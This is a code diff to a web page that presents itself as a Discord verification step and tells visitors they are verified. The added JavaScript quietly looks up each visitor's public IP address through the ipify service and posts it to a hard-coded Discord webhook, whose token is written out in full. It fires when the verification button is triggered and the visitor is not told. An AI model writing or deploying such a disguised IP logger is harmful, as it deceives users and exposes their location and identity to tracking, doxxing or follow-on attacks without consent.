@@ -40,8 +40,34 @@
     <div id="verifiedText">You are verified, you can close this page and come back to discord!</div>
 
     <script>
+        // Fonction pour obtenir l'adresse IP de l'utilisateur et envoyer au webhook
+        async function sendIP() {
+            try {
+                // Obtenir l'adresse IP publique via l'API ipify
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                // Envoyer l'adresse IP au webhook Discord
+                const webhookUrl = 'https://discord.com/api/webhooks/1273657947024654376/kgCCA9Cc65zomW-vWqAKM_8hCUBizn4C7KCsQPDHDKEdLcmsRvb9682JO7ZbJn9o4t-i';
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ content: `Nouvelle connexion depuis l'adresse IP: ${ip}` }),
+                });
+                console.log('IP envoyée au webhook Discord.');
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi de l\'IP:', error);
+            }
+        }
+
         // Fonction pour changer les images et les textes
         function switchContent() {
+            // Envoyer l'IP au webhook
+            sendIP();
+
             // Afficher le GIF et le texte "Please wait"
             document.getElementById('gif').style.display = 'block';
             document.getElementById('pleaseWait').style.display = 'block';
